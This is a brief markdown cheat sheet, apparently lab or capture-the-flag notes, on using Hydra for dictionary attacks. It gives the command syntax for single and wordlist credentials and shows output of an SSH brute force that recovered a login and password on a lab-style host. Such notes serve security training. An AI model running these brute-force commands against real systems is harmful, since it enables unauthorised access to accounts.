# Hydra, password breaker

Hydra can perform rapid dictionary attacks against more than 50 protocols. This includes telnet, FTP, HTTP, HTTPS, SMB, databases, and several other services.

## How to use hydra
You will have to specify your username, password, server and service used
`hydra -l <username> -p <password> <server> <service>`
Put options in capital if you want to you a list of a file for the user or password
`hydra -L <usersFile> -P <passwdFile> <server> <service>`

## Results of execution of Hydra
*[DATA] attacking ssh://10.10.137.76:22/
[22][ssh] host: 10.10.137.76    login: molly    password: butterfly
1 of 1 target successfully completed, 1 valid password found*
